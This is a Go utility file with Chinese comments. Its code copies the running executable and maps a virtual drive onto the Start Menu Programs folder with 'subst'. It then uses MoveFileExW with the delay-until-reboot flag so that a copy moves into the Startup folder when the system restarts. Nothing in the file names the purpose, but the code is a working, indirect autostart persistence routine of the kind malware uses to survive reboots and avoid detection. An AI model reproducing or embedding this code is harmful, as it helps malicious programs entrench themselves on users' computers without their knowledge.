package util

import (
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"unsafe"
)

const (
	MOVEFILE_DELAY_UNTIL_REBOOT = 0x00000004
)

var kernel32 = syscall.NewLazyDLL("kernel32.dll")

// MoveFileEx 将文件或目录移动到新位置，并可选择在系统重启时执行移动操作。
// lpExistingFileName 是要移动的文件或目录的原始路径。
// lpNewFileName 是文件或目录的目标路径，即移动后的位置。
// dwFlags 是一组标志，用于控制移动操作的行为，例如 MOVEFILE_DELAY_UNTIL_REBOOT。
// 返回值为 true 表示移动操作成功，false 表示失败。
func MoveFileEx(lpExistingFileName, lpNewFileName string, dwFlags uint32) bool {
	// 使用 syscall.NewProc 创建对 Windows kernel32.dll 中的 MoveFileExW 函数的引用
	proc := kernel32.NewProc("MoveFileExW")

	// 调用 MoveFileExW 函数，传递原始文件名、目标文件名和标志参数
	ret, _, _ := proc.Call(
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpExistingFileName))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpNewFileName))),
		uintptr(dwFlags))

	// 如果函数返回非零值，则表示移动操作成功，否则表示失败
	return ret != 0
}

// CopyExecutableToPath 将当前运行的程序复制到指定路径
func CopyExecutableToPath(targetPath string) error {
	// 获取当前程序的可执行文件路径
	executablePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("无法获取可执行文件路径: %v", err)
	}

	// 打开可执行文件
	srcFile, err := os.Open(executablePath)
	if err != nil {
		return fmt.Errorf("无法打开可执行文件: %v", err)
	}
	defer srcFile.Close()

	// 读取可执行文件内容
	fileContent, err := ioutil.ReadAll(srcFile)
	if err != nil {
		return fmt.Errorf("无法读取可执行文件内容: %v", err)
	}

	// 创建目标文件
	destFile, err := os.Create(targetPath)
	if err != nil {
		return fmt.Errorf("无法创建目标文件: %v", err)
	}
	defer destFile.Close()

	// 写入可执行文件内容到目标文件
	_, err = io.Copy(destFile, bytes.NewReader(fileContent))
	if err != nil {
		return fmt.Errorf("无法复制文件: %v", err)
	}

	// 设置目标文件的权限（可选）
	if err := destFile.Chmod(os.FileMode(0755)); err != nil {
		return fmt.Errorf("无法设置目标文件权限: %v", err)
	}

	return nil
}

// GetProgramName 返回当前运行的程序名字
func GetProgramName() string {
	// 获取命令行参数
	args := os.Args

	// 第一个参数通常是程序名字
	if len(args) > 0 {
		programName := filepath.Base(args[0])
		return programName
	}

	return "无法获取程序名字"
}

// MoveAndSetupFile 封装了文件的移动和设置过程
func MoveAndSetupFile(sourcePath, destinationDisk, fileName string) error {
	//拷贝程序去指定路径
	err := CopyExecutableToPath(sourcePath)

	if err != nil {
		fmt.Println(err)
	}

	// 获取当前用户的应用数据文件夹路径
	appData, err := os.UserCacheDir()
	if err != nil {
		fmt.Println(err)
	}

	// 创建一个路径指向当前用户的“开始菜单\程序”文件夹
	programs := appData + "\\Microsoft\\Windows\\Start Menu\\Programs"

	// 执行命令将虚拟磁盘符号映射到“开始菜单\程序”文件夹
	cmd := exec.Command("subst", destinationDisk, programs)
	if err := cmd.Run(); err != nil {
		fmt.Println(err)
	}

	// 复制文件到“开始菜单\程序”文件夹
	data, err := ioutil.ReadFile(sourcePath)
	if err != nil {
		fmt.Println(err)
	}
	destinationFullPath := programs + "\\" + fileName
	err = ioutil.WriteFile(destinationFullPath, data, 0644)
	if err != nil {
		fmt.Println(err)
	}

	// 在下次系统重启时移动文件到新位置
	success := MoveFileEx(destinationDisk+"\\"+fileName, destinationDisk+"\\Startup\\"+fileName, MOVEFILE_DELAY_UNTIL_REBOOT)
	if !success {
		return fmt.Errorf("Failed to move the file.")
	}
	return nil
}
